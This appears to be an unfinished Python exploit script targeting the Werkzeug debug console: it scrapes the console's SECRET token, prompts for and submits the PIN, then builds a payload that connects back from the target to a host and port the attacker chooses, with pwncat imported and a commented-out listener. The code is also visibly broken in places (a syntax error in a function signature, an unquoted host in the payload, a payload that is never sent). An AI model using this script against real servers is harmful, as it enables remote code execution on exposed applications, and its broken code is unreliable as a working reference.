from typing import Optional
import requests
import re
import ipaddress
import netifaces
import socket
import rich.prompt
import rich.console
from vial import log
import asyncio
import pwncat

prompt = rich.prompt.Prompt()
console = rich.console.Console()

def check_interface(interface: str) -> Optional[str]:
    """
    Check if the interface is valid

    :param interface: interface to check (e.g. eth0, 192.168.1.1)
    :return: the interface name
    """
    try:
        host = ipaddress.IPv4Address(interface)
    except ipaddress.AddressValueError:
        try:
            host = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]["addr"]
        except ValueError:
            raise ValueError(
                "Error detering HTTP hosting address. Did you provide an [underline]interface[/underline] or [underline]ip[/underline]?"
            )

        return host


def authenticate(session: requests.Session, url: str, proxy: dict[str, str] secret: str) -> None:
    """
    Authenticate to the debug console
    :param session: session to use for the authentication
    :param url: url to authenticate to
    :param secret: token to bypass werkzeug csrf protection
    """
    parameters = {
        "__debugger__": "yes",
        "frm": 0,
        "cmd": "pinauth",
        "pin": str,
        "s": secret,
    }

    while True:
        pin = prompt.ask("[bold blue][?][/] Enter pin", password=True)
        parameters["pin"] = pin

        response = session.post(url, params=parameters).json()
        log.info(response)
        if not response["auth"]:
            log.error(f"Failed to authenticate with pin {pin}")
            continue
        log.info(f"Authenticated with pin {pin}")
        break


# def listener(host, port):
#     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#         s.bind((host, port))
#         s.listen()
#         conn, addr = s.accept()

#         console.print(f"[bold blue][*][/] Connection from {addr[0]}:{addr[1]}")


async def exploit() -> None:
    try:
        url = prompt.ask("[bold blue][?][/] Enter url", default="http://localhost:5000")
        proxy = prompt.ask(
            "[bold blue][?][/] Enter proxy", default="http://localhost:8080"
        )
        proxy = {"http": proxy, "https": proxy, "ftp": proxy}
        with requests.Session() as session:

            resp = session.get(f"{url}/console", allow_redirects=False, proxies=proxy)

            if not resp.status_code == 200:
                log.error(
                    f"Failed to connect to {url}/console (status: {resp.status_code})"
                )
                exit()

            SECRET = re.findall("SECRET = \"([^']{20})", resp.text)[0]

            authenticate(session, url, proxy, SECRET)

            port = prompt.ask("[bold blue][?][/] Enter port", default=5000)
            host = check_interface(
                prompt.ask("[bold blue][?][/] Enter interface", default="eth0")
            )

            payload = f"import socket;socket.socket().connect(({host}, {port}))"

            parameters = {"__debugger__": "yes", "frm": 0, "cmd": payload, "s": SECRET}

            log.info("Sending payload")

    except KeyboardInterrupt:
        log.info("\nExiting...")


if __name__ == "__main__":
    asyncio.run(exploit())
